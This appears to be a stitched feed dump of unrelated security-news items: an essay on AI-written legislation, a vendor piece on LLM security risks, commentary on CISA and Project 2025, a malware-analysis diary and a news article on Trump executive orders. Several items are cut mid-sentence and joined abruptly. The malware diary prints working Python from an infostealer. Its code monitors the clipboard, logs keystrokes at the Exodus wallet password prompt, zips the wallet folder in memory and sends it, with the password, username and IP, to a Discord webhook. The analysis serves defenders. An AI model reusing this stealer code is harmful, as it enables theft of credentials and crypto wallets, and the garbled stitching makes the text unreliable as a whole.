&lt;p&gt;There&amp;#8217;s more that AI can do in the legislative process. AI can summarize bills and answer questions about their provisions. It can highlight aspects of a bill that align with, or are contrary to, different political points of view. We can even imagine a future in which AI can be used to simulate a new law and determine whether or not it would be effective, or what the side effects would be. This means that beyond writing them, AI could help lawmakers &lt;em&gt;understand&lt;/em&gt; laws. Congress is notorious for producing bills hundreds of pages long, and many other countries sometimes have similarly massive omnibus bills that address many issues at once. It&amp;#8217;s impossible for any one person to understand how each of these bills&amp;#8217; provisions would work. Many legislatures employ human analysis in budget or fiscal offices that analyze these bills and offer reports. AI could do this kind of work at greater speed and scale, so legislators could easily query an AI tool about how a particular bill would affect their district or areas of concern.&lt;/p&gt;
&lt;p&gt;This is a use case that the &lt;a href="https://cha.house.gov/modernization"&gt;House &lt;/a&gt;&lt;a href="https://cha.house.gov/modernization"&gt;subcommittee&lt;/a&gt; on modernization &lt;a href="https://cha.house.gov/_cache/files/0/8/08476380-95c3-4989-ad4c-1e2a454b0007/9668ADB6A0D503B944E26EDB81EDC585.cha-modernization-ai-flash-report-10-25-24.pdf"&gt;has urged the Library of Congress&lt;/a&gt; to take action on. Numerous software vendors are &lt;a href="https://www.law.com/legaltechnews/2024/11/22/legaltech-rundown-lexisnexis-releases-lexis-ai-mobile-app-hotshot-launches-new-ma-training-simulation-and-more"&gt;already marketing AI legislative&lt;/a&gt; analysis tools. These tools can potentially find loopholes or, &lt;a href="https://www.technologyreview.com/2023/03/14/1069717/how-ai-could-write-our-laws/"&gt;like the human lobbyists of today&lt;/a&gt;, craft them to benefit particular private interests.&lt;/p&gt;
&lt;p&gt;These capabilities will be attractive to legislators who are looking to expand their power and capabilities but don&amp;#8217;t necessarily have more funding to hire human staff. We should understand the idea of AI-augmented lawmaking contextualized within the longer history of legislative technologies. To serve society at modern scales, we&amp;#8217;ve had to come a long way from the Athenian ideals of direct democracy and sortition. Democracy no longer involves just one person and one vote to decide a policy. It involves hundreds of thousands of constituents electing one representative, who is augmented by a staff as well as subsidized by lobbyists, and who implements policy through a vast administrative state coordinated by digital technologies. Using AI to help those representatives specify and refine their policy ideas is part of a long history of transformation.&lt;/p&gt;
&lt;p&gt;Whether all this AI augmentation is good for all of us subject to the laws they make is less clear. There are real risks to AI-written law, but those risks are not dramatically different from what we endure today. AI-written law trying to optimize for certain policy outcomes may get it wrong (just as many human-written laws are misguided). AI-written law may be manipulated to benefit one constituency over others, by the tech companies that develop the AI, or by the legislators who apply it, just as human lobbyists steer policy to benefit their clients.&lt;/p&gt;
&lt;p&gt;Regardless of what anyone thinks of any of this, regardless of whether it will be a net positive or a net negative, AI-made legislation is coming&amp;#8212;the growing complexity of policy demands it. It doesn&amp;#8217;t require any changes in legislative procedures or agreement from any rules committee. All it takes is for one legislative assistant, or lobbyist, to fire up a chatbot and ask it to create a draft. When legislators voted on that Brazilian bill in 2023, &lt;a href="https://apnews.com/article/brazil-artificial-intelligence-porto-alegre-5afd1240afe7b6ac202bb0bbc45e08d4"&gt;they didn&amp;#8217;t know it was AI-written&lt;/a&gt;; the use of ChatGPT was undisclosed. And even if they had known, it&amp;#8217;s not clear it would have made a difference. In the future, as in the past, we won&amp;#8217;t always know which laws will have good impacts and which will have bad effects, regardless of the words on the page, or who (or what) wrote them.&lt;/p&gt;

However, this rapid integration brings significant AI security challenges that organizations must address. Insights from Qualys show that &lt;a href="https://blog.qualys.com/product-tech/2024/12/05/secure-your-generative-investments-qualys-advances-enterprise-trurisk-platform-with-qualys-totalai-to-protect-your-llm-investments"&gt;over 1,255 organizations have deployed AI/ML software across 2.8 million assets&lt;/a&gt;, with 6.2%—approximately 175,000 assets—classified as critical and at high risk for cyber threats.&lt;/p&gt;



&lt;p&gt;As businesses increasingly leverage AI/ML to optimize operations, improve decision-making, and deliver personalized experiences, protecting these critical assets has become crucial. The expanding AI attack surface demands robust security solutions to safeguard AI investments, ensure compliance, and build trust in these transformative technologies. A recent whitepaper, &lt;a href="https://www.qualys.com/forms/whitepapers/lp/qualys-totalai-whitepaper/"&gt;&lt;strong&gt;&amp;#8220;Securing the Future: TotalAI for LLM and Generative AI Workloads,&amp;#8221;&lt;/strong&gt;&lt;/a&gt; explores these challenges and offers actionable strategies to secure AI systems while fostering responsible innovation.&lt;/p&gt;



&lt;p&gt;With AI adoption projected to add &lt;a href="https://www.pwc.com/gx/en/issues/artificial-intelligence/publications/artificial-intelligence-study.html#:~:text=Total%20economic%20impact%20of%20AI%20in%20the%20period%20to%202030&amp;amp;text=AI%20could%20contribute%20up%20to,come%20from%20consumption-side%20effects." rel="noreferrer noopener" target="_blank"&gt;$15.7 trillion to the global economy by 2030&lt;/a&gt;, industries like healthcare, financial services, and retail are leading the charge. However, this rapid growth exposes organizations to emerging vulnerabilities that require advanced security measures and proactive risk management.&lt;/p&gt;



&lt;span id="more-37166"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="top-critical-security-challenges-for-llms-and-generative-ai"&gt;&lt;strong&gt;Top Critical Security Challenges for LLMs and Generative AI&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;As generative AI and LLMs take center stage in the digital transformation journey, their capabilities are matched by the complexity of the security challenges they introduce. From safeguarding sensitive information to meeting stringent compliance requirements, organizations are struggling to adopt a holistic approach to protecting their AI investments. However, with a focus on innovation and trust, you can address these concerns head-on.&lt;/p&gt;



&lt;p&gt;Here, we outline the critical security risks organizations must navigate to responsibly harness the power of generative AI.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;1. Data Privacy Risks&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;One of the most pressing concerns is the inadvertent exposure of sensitive data. According to research, 55% of data leaders rank sensitive information exposure as a top concern&lt;strong&gt;.&lt;/strong&gt; LLMs can unintentionally memorize sensitive data, which, coupled with risks like inference attacks, put confidential information at significant risk.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;2. Adversarial Attacks&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Adversarial attacks, such as evasion, poisoning, and model inversion, threaten the integrity of AI models. These attacks can lead to incorrect or malicious outputs, undermining the trustworthiness of AI systems.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;3. Intellectual Property Risks&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Model theft and reverse-engineering are growing concerns, especially for organizations that rely on proprietary algorithms and datasets. Safeguarding these assets is critical to maintaining competitive advantage.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;4. Compliance Complexities&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Regulatory requirements, such as those outlined in the &lt;a href="https://artificialintelligenceact.eu/" rel="noreferrer noopener" target="_blank"&gt;EU AI Act&lt;/a&gt; demand transparency, fairness, and ethical governance, adding another layer of complexity to managing AI systems.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;&amp;#8220;Project 2025&amp;#8217;s recommendations&amp;#8212;essentially because this one thing caused anger&amp;#8212;is to just strip the agency of all of its support altogether,&amp;#8221; he said. &amp;#8220;And CISA&amp;#8217;s functions go so far beyond its role in the information space in a way that would do real harm to election officials and leave them less prepared to tackle future challenges.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In the DHS chapter of Project 2025, Cucinelli suggests gutting CISA almost entirely, moving its core responsibilities on critical infrastructure to the Department of Transportation. It&amp;#8217;s a suggestion that Adav Noti, the executive director of the nonpartisan voting rights advocacy organization Campaign Legal Center, &lt;a href="https://www.democracydocket.com/analysis/unmasking-the-anti-democracy-agenda-of-project-2025/"&gt;previously described&lt;/a&gt; to Democracy Docket as &amp;#8220;absolutely bonkers.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s located at Homeland Security because the whole premise of the Department of Homeland Security is that it&amp;#8217;s supposed to be the central resource for the protection of the nation,&amp;#8221; Noti said. &amp;#8220;And that the important functions shouldn&amp;#8217;t be living out in siloed agencies.&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69838</guid><category>Uncategorized</category><category>cyberattack</category><category>cybersecurity</category><category>ransomware</category></item><item><title>CISA Releases Seven Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/01/28/cisa-releases-seven-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released seven Industrial Control Systems (ICS) advisories on January 28, 2025.

I already wrote a diary related to this application[&lt;a href="https://isc.sans.edu/forums/diary/Python+Infostealer+Patching+Windows+Exodus+App/31276"&gt;2&lt;/a&gt;]. Yesterday, I found a new one that behaves differently. My previous diary described&amp;nbsp;a Python script that will patch the original Exodus software. Today, it&amp;rsquo;s a real &amp;ldquo;info stealer&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;The file has been discovered with the name &amp;ldquo;steal.py&amp;rdquo; and has a score of 8/56 on VirusTotal[&lt;a href="https://www.virustotal.com/gui/file/160f9f71ff722c4bad8bd9108c579f1cc585f0811fa2e9525de95e0fb2ba2aa0/details"&gt;3&lt;/a&gt;] (SHA256: 160f9f71ff722c4bad8bd9108c579f1cc585f0811fa2e9525de95e0fb2ba2aa0). It has many interesting capabilities. Let&amp;rsquo;s review them.&lt;/p&gt;

&lt;p&gt;First, it starts by implementing a clipboard monitoring thread:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
def monitor_clipboard():
    global clipboard_content, clipboard_updated
    clipboard_content = &amp;quot;&amp;quot;
    clipboard_updated = False

    while True:
        current_content = clipboard.paste()
        if current_content != clipboard_content:
            clipboard_content = current_content
            clipboard_updated = True
        time.sleep(0.5)
[...]
clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
clipboard_thread.start()&lt;/pre&gt;

&lt;p&gt;Indeed, there&amp;nbsp;are chances that the victim will have the wallet password stored in his/her password manager.&lt;/p&gt;

&lt;p&gt;A second thread is started to listen to keyboard events. It&amp;rsquo;s not a simple keylogger because, depending on the key pressed, it will perform different actions. Example when the victim pressed CTRL-V (Paste):&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
listener_thread = threading.Thread(target=event_listener, daemon=True)
listener_thread.start()
[...]
    elif event.name == &amp;quot;v&amp;quot; and keyboard.is_pressed(&amp;quot;ctrl&amp;quot;) and not ctrl_v_processed:
        # Handle Ctrl+V for pasting clipboard content
        ctrl_v_processed = True
        if clipboard_updated:
            clipboard_updated = False
            pasted_content = clipboard_content.strip()
            print(f&amp;quot;Using clipboard content (Ctrl + V): {pasted_content}&amp;quot;)
            captured_keys.clear()  # Clear current input
            captured_keys.extend(list(pasted_content))  # Append clipboard content to captured keys
            print(f&amp;quot;Updated input after paste: {''.join(captured_keys)}&amp;quot;)&lt;/pre&gt;

&lt;p&gt;Another nice feature is the &amp;ldquo;fileless&amp;rdquo; behavior of the Python script. A fileless malware tries to reduce as much as possible their footprint in the filesystem. In this script, all data are processed in memory before being exfiltrated:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
exodus_zip = compress_directory_in_memory(exodus_wallet_path)
[...]
def compress_directory_in_memory(source_dir):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_dir)
                zipf.write(file_path, arcname)
    zip_buffer.seek(0)  # Move to the beginning of the buffer
    return zip_buffer&lt;/pre&gt;

&lt;p&gt;In the same way, data stored in memory are exfiltrated through Discord:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
def send_file_with_text_in_memory(webhook_url, file_buffer, file_name, additional_message=&amp;quot;&amp;quot;):
    content = f&amp;quot;**User:** {get_username()}\n**IP:** {get_ip()}\n{additional_message}&amp;quot;
    files = {&amp;quot;file&amp;quot;: (file_name, file_buffer, &amp;quot;application/zip&amp;quot;)}
    data = {&amp;quot;content&amp;quot;: content}
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
        print(&amp;quot;File and text sent successfully.&amp;quot;)
    except Exception as e:
        print(f&amp;quot;Failed to send file: {e}&amp;quot;)&lt;/pre&gt;

&lt;p&gt;How is Exodus targeted? First, the script checks the existence of &amp;ldquo;passphare.json&amp;rdquo;:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
passphrase_file = os.path.join(exodus_wallet_path, 'passphrase.json')&lt;/pre&gt;

&lt;p&gt;This is the keystone file that contains the victim&amp;rsquo;s encrypted private key. The script assumes that the wallet&amp;nbsp;is not protected by a password and it exfiltrates everything, including the JSON file. If not file is found, the keylogger will be used to capture the victim&amp;rsquo;s password.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20250128-1.png" style="width: 600px; height: 239px;" /&gt;&lt;/p&gt;

&lt;p&gt;To achieve this, it waits for the password prompt window:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
while True:
    if is_exodus_password_prompt_active():
        print(&amp;quot;Password prompt detected.&amp;quot;)
        start_exodus_wallet_keylogging()
    elif is_exodus_main_wallet_active():
        print(&amp;quot;Main Exodus wallet window detected.&amp;quot;)
        break
    time.sleep(1)
[...]
def is_exodus_password_prompt_active():
    windows = gw.getAllTitles()
    for title in windows:
        if re.search(r&amp;quot;Enter password&amp;quot;, title, re.IGNORECASE):
            return True
    return False
[...]
def is_exodus_main_wallet_active():
    windows = gw.getAllTitles()
    for title in windows:
        if re.search(r&amp;quot;EXODUS&amp;quot;, title, re.IGNORECASE):
            return True
    return False&lt;/pre&gt;

&lt;p&gt;When the window has the focus, the keylogger is started.&lt;/p&gt;

&lt;p&gt;Note that the script checks if the password is correct:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
start_time = time.time()
password_correct = False
while time.time() - start_time &amp;lt; 2:  # Wait for up to 2 seconds
    if is_main_exodus_window_open():
        password_correct = True
        break
    if is_error_message_displayed():
        print(&amp;quot;Invalid password detected. Waiting for user to retry...&amp;quot;)
        break
    time.sleep(0.5)

if password_correct:
    print(&amp;quot;Password confirmed. Sending password...&amp;quot;)
    send_embed_with_uploaded_file(
        webhook_url,
        title=&amp;quot;Exodus Password Captured&amp;quot;,
        description=&amp;quot;A valid password has been captured successfully for Exodus.&amp;quot;,
        color=16711680,
        fields=[
            {&amp;quot;name&amp;quot;: &amp;quot;Password&amp;quot;, &amp;quot;value&amp;quot;: password, &amp;quot;inline&amp;quot;: False},
            {&amp;quot;name&amp;quot;: &amp;quot;PC Username&amp;quot;, &amp;quot;value&amp;quot;: get_username(), &amp;quot;inline&amp;quot;: True},
            {&amp;quot;name&amp;quot;: &amp;quot;IP Address&amp;quot;, &amp;quot;value&amp;quot;: get_ip(), &amp;quot;inline&amp;quot;: True},
        ]
    )
    password_submitted = True  # Mark password as submitted
    break&lt;/pre&gt;

&lt;p&gt;Of course, the script will be probably delivered obfuscated to bypass classic security controls... Or, it will be part of a deeper attack and will be launched manually by the attacker because it does not implement any persistence mechanism.&lt;/p&gt;

Greg Meland.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;President Trump&lt;/strong&gt; last week issued a flurry of executive orders that upended a number of government initiatives focused on improving the nation&amp;#8217;s cybersecurity posture. The president fired all advisors from the Department of Homeland Security&amp;#8217;s Cyber Safety Review Board, called for the creation of a strategic cryptocurrency reserve, and voided a Biden administration action that sought to reduce the risks that artificial intelligence poses to consumers, workers and national security.&lt;/p&gt;
&lt;p&gt;On his first full day back in the White House, Trump dismissed all 15 advisory committee members of the &lt;a href="https://en.wikipedia.org/wiki/Cyber_Safety_Review_Board" rel="noopener" target="_blank"&gt;Cyber Safety Review Board&lt;/a&gt; (CSRB), a nonpartisan government entity established in February 2022 with a mandate to investigate the causes of major cybersecurity events. The CSRB has so far produced three detailed reports, including an analysis of the &lt;a href="https://www.wired.com/story/log4j-log4shell/" rel="noopener" target="_blank"&gt;Log4Shell vulnerability&lt;/a&gt; crisis, attacks from &lt;a href="https://krebsonsecurity.com/tag/lapsus/" rel="noopener" target="_blank"&gt;the cybercrime group LAPSUS$&lt;/a&gt;, and the 2023 &lt;a href="https://www.cisa.gov/resources-tools/resources/CSRB-Review-Summer-2023-MEO-Intrusion" rel="noopener" target="_blank"&gt;Microsoft Exchange Online breach&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The CSRB was in the midst of an inquiry into cyber intrusions uncovered recently across a broad spectrum of U.S. telecommunications providers at the hands of Chinese state-sponsored hackers. One of the CSRB&amp;#8217;s most recognizable names is &lt;strong&gt;Chris Krebs &lt;/strong&gt;(no relation), the former director of the &lt;strong&gt;Cybersecurity and Infrastructure Security Agency&lt;/strong&gt; (CISA). Krebs was fired by President Trump in November 2020 for declaring the presidential contest was the most secure in American history, and for refuting Trump&amp;#8217;s false claims of election fraud.&lt;/p&gt;
&lt;p&gt;South Dakota Governor &lt;strong&gt;Kristi Noem&lt;/strong&gt;, confirmed by the U.S. Senate last week as the new director of the DHS, criticized CISA at her confirmation hearing, &lt;em&gt;TheRecord&lt;/em&gt; &lt;a href="https://therecord.media/kristi-noem-cisa-smaller-nimble?utm_medium=email&amp;amp;_hsenc=p2ANqtz-80A9JU5jFUojRnewo-h4MRW17b74bMAW6oR5rGLelMqQ7jRJp3Ors1qYeq5RFK2jrpXM9V5J2o-RGJSorsePm_8KCvoZ8nFsrOw8h_pdBDQggry0c&amp;amp;_hsmi=343361648&amp;amp;utm_content=343361495&amp;amp;utm_source=hs_email" rel="noopener" target="_blank"&gt;reports&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Noem told lawmakers CISA needs to be &amp;#8220;much more effective, smaller, more nimble, to really fulfill their mission,&amp;#8221; which she said should be focused on hardening federal IT systems and hunting for digital intruders. Noem said the agency&amp;#8217;s work on fighting misinformation shows it has &amp;#8220;gotten far off mission&amp;#8221; and involved &amp;#8220;using their resources in ways that was never intended.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;The misinformation and disinformation that they have stuck their toe into and meddled with, should be refocused back onto what their job is,&amp;#8221; she said.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Moses Frost&lt;/strong&gt;, a cybersecurity instructor with the SANS Institute, compared the sacking of the CSRB members to firing all of the experts at the &lt;strong&gt;National Transportation Safety Board&lt;/strong&gt; (NTSB) while they&amp;#8217;re in the middle of an investigation into a string of airline disasters.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I don’t recall seeing an &amp;#8216;NTSB Board&amp;#8217; being fired during the middle of a plane crash investigation,&amp;#8221; Frost said in a recent SANS newsletter. &amp;#8220;I can say that the attackers in the phone companies will not stop because the review board has gone away. We do need to figure out how these attacks occurred, and CISA did appear to be doing some good for the vast majority of the federal systems.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Speaking of transportation, &lt;em&gt;The Record&lt;/em&gt; notes that Transportation Security Administration chief &lt;strong&gt;David Pekoske&lt;/strong&gt; &lt;a href="https://therecord.media/tsa-chief-behind-cyber-directives-ousted-trump-administration?utm_medium=email&amp;amp;_hsenc=p2ANqtz-_a5PHD4Ff2FlOiHIlYbcfVNbftiTItDbxlH5TxzCLZicEcan3et6L6nmVmhC57_5AXp-a1k45WwHO6jbVxejLlMjPtTTdVzGtbreDzSl6fzHhGdkg&amp;amp;_hsmi=343497657&amp;amp;utm_content=343496082&amp;amp;utm_source=hs_email" rel="noopener" target="_blank"&gt;was fired&lt;/a&gt; despite overseeing critical cybersecurity improvements across pipeline, rail and aviation sectors. Pekoske was appointed by Trump in 2017 and had his 5-year tenure renewed in 2022 by former President Joe Biden.&lt;/p&gt;
&lt;h2&gt;AI &amp;amp; CRYPTOCURRENCY&lt;/h2&gt;
&lt;p&gt;Shortly after being sworn in for a second time, Trump voided a Biden executive order that focused on supporting research and development in artificial intelligence. The previous administration&amp;#8217;s order on AI was crafted with an eye toward managing &lt;a href="https://www.ic3.gov/PSA/2024/PSA241203" rel="noopener" target="_blank"&gt;the safety and security risks introduced by the technology&lt;/a&gt;. But a &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/01/fact-sheet-president-donald-j-trump-takes-action-to-enhance-americas-ai-leadership/" rel="noopener" target="_blank"&gt;statement&lt;/a&gt; released by the White House said Biden&amp;#8217;s approach to AI had hindered development, and that the United States would support AI systems that are &amp;#8220;free from ideological bias or engineered social agendas,&amp;#8221; to maintain leadership.&lt;/p&gt;
&lt;p&gt;The Trump administration issued &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/01/fact-sheet-executive-order-to-establish-united-states-leadership-in-digital-financial-technology/" rel="noopener" target="_blank"&gt;its own executive order on AI&lt;/a&gt;, which calls for an &amp;#8220;AI Action Plan&amp;#8221; to be led by the assistant to the president for science and technology, the White House &amp;#8220;AI &amp;amp; crypto czar,&amp;#8221; and the national security advisor. It also directs the White House to revise and reissue policies to federal agencies on the government&amp;#8217;s acquisition and governance of AI &amp;#8220;to ensure that harmful barriers to America&amp;#8217;s AI leadership are eliminated.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Trump&amp;#8217;s AI &amp;amp; crypto czar is &lt;strong&gt;David Sacks&lt;/strong&gt;, an entrepreneur and Silicon Valley venture capitalist who argues that the Biden administration&amp;#8217;s approach to AI and cryptocurrency has driven innovation overseas. Sacks recently asserted that non-fungible cryptocurrency tokens and memecoins are neither securities nor commodities, but rather should be treated as &amp;#8220;collectibles&amp;#8221; like baseball cards and stamps.&lt;/p&gt;
&lt;p&gt;&lt;span class="s1"&gt;There is already a legal definition of collectibles under the U.S. tax code that applies to things like art or antiques, which can be subject to high capital gains taxes. But &lt;strong&gt;Joe Hall&lt;/strong&gt;, a capital markets attorney and partner at Davis Polk, &lt;a href="https://finance.yahoo.com/news/crypto-czar-david-sacks-says-224508277.html?guccounter=1&amp;amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;amp;guce_referrer_sig=AQAAAL0Zay1PbdGAe14O3Q6FoNdB1zkg6wbzSRDfb7oPUC6Wd6zrQ6vU2RRSCVbDRAzdKV-8hUw3m5wdMKoCzprArK-YuIyoeEjJwTP3ZNk1AoW8dVIhp4KFD3-c9i7NrrUPaY3u2e2yLSFfzlqeJDnJ55BTbyBLHx9pM_KywC0pCxWf" rel="noopener" target="_blank"&gt;told &lt;em&gt;Fortune&lt;/em&gt;&lt;/a&gt; there are&lt;/span&gt; no market regulations that apply to collectibles under U.S. securities law. Hall said Sacks’ comments “suggest a viewpoint that it would not be appropriate to regulate these things the way we regulate securities.”&lt;/p&gt;
&lt;p&gt;The new administration&amp;#8217;s position makes sense considering that the Trump family is deeply and personally invested in a number of recent memecoin ventures that have attracted billions from investors. President Trump and First Lady Melania Trump each launched their own vanity memecoins this month, dubbed &lt;strong&gt;$TRUMP&lt;/strong&gt; and &lt;strong&gt;$MELANIA&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The Wall Street Journal&lt;/em&gt; &lt;a href="https://www.wsj.com/finance/trump-meme-coin-crypto-explained-c881afff" rel="noopener" target="_blank"&gt;reported Thursday&lt;/a&gt; the market capitalization of $TRUMP stood at about $7 billion, down from a peak of near $15 billion, while $MELANIA is hovering somewhere in the $460 million mark. Just two months before the 2024 election, Trump&amp;#8217;s three sons debuted a cryptocurrency token called &lt;strong&gt;World Liberty Financial&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Despite maintaining a considerable personal stake in how cryptocurrency is regulated, Trump issued &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/01/fact-sheet-executive-order-to-establish-united-states-leadership-in-digital-financial-technology/" rel="noopener" target="_blank"&gt;an executive order on January 23&lt;/a&gt; calling for a working group to be chaired by Sacks that would develop &amp;#8220;a federal regulatory framework governing digital assets, including stablecoins,&amp;#8221; and evaluate the creation of a &amp;#8220;strategic national digital assets stockpile.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Translation: Using taxpayer dollars to prop up the speculative, volatile, and highly risky cryptocurrency industry, which has been marked by endless scams, rug-pulls, 8-figure cyber heists, rampant fraud, and unrestrained innovations in money laundering.&lt;span id="more-70172"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;WEAPONIZATION &amp;amp; DISINFORMATION&lt;/h2&gt;
&lt;p&gt;Prior to the election, President Trump frequently vowed to use a second term to exact retribution against his perceived enemies. Part of that promise materialized in an executive order Trump issued last week titled &amp;#8220;&lt;a href="https://www.whitehouse.gov/presidential-actions/2025/01/ending-the-weaponization-of-the-federal-government/" rel="noopener" target="_blank"&gt;Ending the Weaponization of the Federal Government&lt;/a&gt;,&amp;#8221; which decried &amp;#8220;an unprecedented, third-world weaponization of prosecutorial power to upend the democratic process,&amp;#8221; in the prosecution of more than 1,500 people who invaded the U.S. Capitol on Jan. 6, 2021.&lt;/p&gt;
&lt;p&gt;On Jan. 21, Trump &lt;a href="https://www.nbcnews.com/politics/justice-department/trump-set-pardon-defendants-stormed-capitol-jan-6-2021-rcna187735" rel="noopener" target="_blank"&gt;commuted the sentences&lt;/a&gt; of several leaders of the Proud Boys and Oath Keepers who were convicted of seditious conspiracy. He also issued &amp;#8220;a full, complete and unconditional pardon to all other individuals convicted of offenses related to events that occurred at or near the United States Capitol on January 6, 2021,&amp;#8221; which include those who assaulted law enforcement officers.&lt;/p&gt;
&lt;p&gt;The New York Times &lt;a href="https://www.nytimes.com/2025/01/20/us/politics/weaponization-government-executive-order-trump.html" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; &amp;#8220;the language of the document suggests — but does not explicitly state — that the Trump administration review will examine the actions of local district attorneys or state officials, such as the district attorneys in Manhattan or Fulton County, Ga., or the New York attorney general, all of whom filed cases against President Trump.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Another Trump order called &amp;#8220;&lt;a href="https://www.whitehouse.gov/presidential-actions/2025/01/restoring-freedom-of-speech-and-ending-federal-censorship/" rel="noopener" target="_blank"&gt;Restoring Freedom of Speech and Ending Federal Censorship&lt;/a&gt;&amp;#8221; asserts:&lt;/p&gt;
&lt;p&gt;&amp;#8220;Over the last 4 years, the previous administration trampled free speech rights by censoring Americans’ speech on online platforms, often by exerting substantial coercive pressure on third parties, such as social media companies, to moderate, deplatform, or otherwise suppress speech that the Federal Government did not approve,&amp;#8221; the Trump administration alleged. &amp;#8220;Under the guise of combatting &amp;#8216;misinformation,&amp;#8217; &amp;#8216;disinformation,&amp;#8217; and &amp;#8216;malinformation,&amp;#8217; the Federal Government infringed on the constitutionally protected speech rights of American citizens across the United States in a manner that advanced the Government’s preferred narrative about significant matters of public debate.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Both of these executive orders have &lt;a href="https://bsky.app/profile/katestarbird.bsky.social/post/3kdu7ucy3jd2f" rel="noopener" target="_blank"&gt;potential implications&lt;/a&gt; for security, privacy and civil liberties activists who have sought to track conspiracy theories and raise awareness about disinformation efforts on social media coming from U.S. adversaries.&lt;/p&gt;
&lt;p&gt;In the wake of the 2020 election, Republicans created the &lt;strong&gt;House Judiciary Committee&amp;#8217;s Select Subcommittee on the Weaponization of the Federal Government&lt;/strong&gt;. Led by GOP &lt;strong&gt;Rep. Jim Jordan&lt;/strong&gt; of Ohio, the committee&amp;#8217;s stated purpose was to investigate alleged collusion between the Biden administration and tech companies to unconstitutionally shut down political speech.&lt;/p&gt;
&lt;p&gt;The GOP committee focused much of its ire at members of the short-lived &lt;a href="https://en.wikipedia.org/wiki/Disinformation_Governance_Board" rel="noopener" target="_blank"&gt;Disinformation Governance Board&lt;/a&gt;, an advisory board to DHS created in 2022 (the &amp;#8220;combating misinformation, disinformation, and malinformation&amp;#8221; quote from Trump&amp;#8217;s executive order is a reference to the board&amp;#8217;s stated mission). Conservative groups seized on social media posts made by the director of the board, who &lt;a href="https://www.npr.org/2022/05/21/1100438703/dhs-disinformation-board-nina-jankowicz" rel="noopener" target="_blank"&gt;resigned&lt;/a&gt; after facing death threats. The board was dissolved by DHS soon after.&lt;/p&gt;
&lt;p&gt;In his first administration, President Trump created a special prosecutor to probe the origins of the FBI&amp;#8217;s investigation into possible collusion between the Trump campaign and Russian operatives seeking to influence the 2016 election. Part of that inquiry examined evidence gathered by some of the world’s most renowned cybersecurity experts who identified &lt;a href="https://krebsonsecurity.com/2021/09/lawsuits-indictments-revive-trump-alfa-bank-story/" rel="noopener" target="_blank"&gt;frequent and unexplained communications&lt;/a&gt; between an email server used by the &lt;strong&gt;Trump Organization&lt;/strong&gt; and &lt;strong&gt;Alfa Bank&lt;/strong&gt;, one of Russia’s largest financial institutions.&lt;/p&gt;
&lt;p&gt;Trump&amp;#8217;s Special Prosecutor &lt;strong&gt;John Durham&lt;/strong&gt; later subpoenaed and/or deposed dozens of security experts who&amp;#8217;d collected, viewed or merely commented on the data. Similar harassment and deposition demands would come from lawyers for Alfa Bank. Durham ultimately indicted &lt;strong&gt;Michael Sussman&lt;/strong&gt;, the former federal cybercrime prosecutor who reported the oddity to the FBI. Sussman was acquitted in May 2022. Last week, Trump appointed Durham to lead the U.S. attorney&amp;#8217;s office in Brooklyn, NY.&lt;/p&gt;
